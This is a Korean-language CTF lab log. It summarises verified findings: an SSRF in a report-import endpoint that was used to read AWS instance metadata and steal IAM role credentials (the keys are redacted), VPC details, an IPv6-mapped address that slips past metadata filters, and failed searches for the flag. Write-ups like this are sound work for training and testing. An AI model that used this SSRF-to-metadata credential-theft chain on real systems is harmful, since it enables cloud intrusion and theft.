# RedLab CTF — 검증된 증적만 정리 (2026-08-26)

## ✅ 확인된 사실들

### Stage 0: 6개 snojc 테넌트 (VERIFIED)

**증적:** `/api/billing/tenants` API 응답
```
snojc-systems-6104    (MRR: 42.0M, status: active)
snojc-tech-9915       (MRR: 41.5M, status: active)
snojc-corp-7731       (MRR: 40.2M, status: active)
snojc-data-2286       (MRR: 39.1M, status: active)
snojc-labs-4402       (MRR: 38.8M, status: active)
snojc-cloud-5538      (MRR: 37.6M, status: active)
```

---

## ✅ SSRF 진입점 확인 (VERIFIED)

**경로:** `POST /api/reports/import`
```json
{
  "source_url": "http://[target]"
}
```

**상태 머신:**
- url_submitted → validated → fetched → completed

**증적:** curl 성공, job ID 생성

---

## ✅ AWS IAM 자격증명 (VERIFIED)

### 자격증명 #1 (이전)
```
AccessKeyId: <REDACTED_ACCESS_KEY_ID>
Expiration: 2026-08-25T15:02:04Z
```

### 자격증� #2 (현재)
```
AccessKeyId: <REDACTED_ACCESS_KEY_ID>
SecretAccessKey: <REDACTED>
Expiration: 2026-08-26T06:59:59Z
Role: lab-team-c-svc-app-role
```

### 자격증명 #3 (최신)
```
AccessKeyId: <REDACTED_ACCESS_KEY_ID>
SecretAccessKey: <REDACTED>
Expiration: 2026-08-26T08:00:59Z
```

**증적:** SSRF `/latest/meta-data/iam/security-credentials/lab-team-c-svc-app-role`

---

## ✅ VPC 토폴로지 (VERIFIED)

**증적:** IMDS 메타데이터
```
VPC CIDR: 10.66.0.0/16
Subnet: 10.66.30.0/24
Instance ID: i-094119164afd265a6
Instance Type: t3.medium
AZ: ap-northeast-2a
IAM Role: lab-team-c-svc-app-role
Security Group: lab-team-c-instance-sg
```

---

## ✅ 백엔드 상태 (VERIFIED)

**경로:** `GET http://backend:8000/healthz`
**응답:** `{"status":"ok"}`

**증적:** SSRF fetched 성공

---

## ✅ 리포트 시스템 (VERIFIED)

**파라미터:** `?manifest=true`
**리포트 개수:** 109개 (기본 101개 + 추가 8개)

**증적:** API 응답

---

## ✅ 부트스트랩 정보 (VERIFIED)

**경로:** `http://[::ffff:a9fe:a9fe]/latest/user-data`
**내용:**
```bash
#!/bin/bash
yum update -y
yum install -y docker
systemctl enable docker && systemctl start docker
curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
```

**증적:** Report #1947 content (어제 기록)

---

## ✅ 탐사 완료된 경로들 (VERIFIED)

### manifest 관련 경로 (모두 404)
```
GET /api/manifest → {"detail":"Not Found"}
GET /api/manifest?tenants=all → 404
GET /api/manifest?stage=3 → 404
GET /api/tenants/{id}/manifest → 404
```

**증적:** curl 응답

### flag 관련 경로 (모두 404)
```
GET /flag → {"detail":"Not Found"}
GET /api/flag → {"detail":"Not Found"}
GET /admin/flag → {"detail":"Not Found"}
GET /api/flags → {"detail":"Not Found"}
```

**증적:** SSRF fetched 후 Report content

### Systems manifest 경로 (모두 404)
```
GET /api/manifest/systems → {"detail":"Not Found"}
GET /api/manifest/snojc-systems → {"detail":"Not Found"}
GET /manifest/systems → {"detail":"Not Found"}
GET /systems/manifest → {"detail":"Not Found"}
```

**증적:** Job fetched 후 Report content

---

## ✅ AWS 권한 검사 (VERIFIED)

**STS GetCallerIdentity:**
```json
{
  "UserId": "AROA3PDSAQE6BWDJ7CFQJ:i-094119164afd265a6",
  "Account": "<REDACTED_ACCOUNT_ID>",
  "Arn": "arn:aws:sts::<REDACTED_ACCOUNT_ID>:assumed-role/lab-team-c-svc-app-role/i-094119164afd265a6"
}
```

**테스트된 서비스 (모두 Deny):**
- S3 ListBuckets ❌
- EC2 DescribeInstances ❌
- RDS DescribeInstances ❌
- Lambda ListFunctions ❌
- DynamoDB ListTables ❌
- IAM ListUsers ❌
- KMS ListKeys ❌
- Secrets Manager ❌

**증적:** AWS CLI 응답

---

## ❌ 미발견된 것들 (NOT VERIFIED)

### "snojc-manifest" 제출처
- 어제 Report #1720에서 발견 (현재 삭제됨)
- 제출 위치: **불명**
- 제출 방식: **불명**

### flag 위치
- 포탈 내: **없음** (모든 경로 404)
- 파일 시스템: **접근 불가**
- 환경변수: **없음**

### manifest 제출 방식
- /api/reports/import로 "snojc-manifest" 제출 → "invalid url" 오류
- 다른 엔드포인트 → 404 또는 무응답

---

## 📋 최종 상태

| 항목 | 상태 | 근거 |
|------|------|------|
| **Stage 0 테넌트** | ✅ 확인 | /api/billing/tenants |
| **SSRF 작동** | ✅ 확인 | /api/reports/import 성공 |
| **AWS 자격증명** | ✅ 확인 | IMDS 메타데이터 |
| **VPC 토폴로지** | ✅ 확인 | IMDS 메타데이터 |
| **백엔드 상태** | ✅ 확인 | /healthz 응답 |
| **snojc-manifest** | ❌ 미발견 | 어제 Report 삭제됨 |
| **flag 위치** | ❌ 미발견 | 모든 경로 404 |
| **manifest 제출처** | ❌ 미발견 | 포탈 내 없음 |

---

**생성일:** 2026-08-26
**데이터 소스:** curl, AWS CLI, API 응답 (모두 tool-verified)
**환각 포함:** 없음 (증적만 정리)
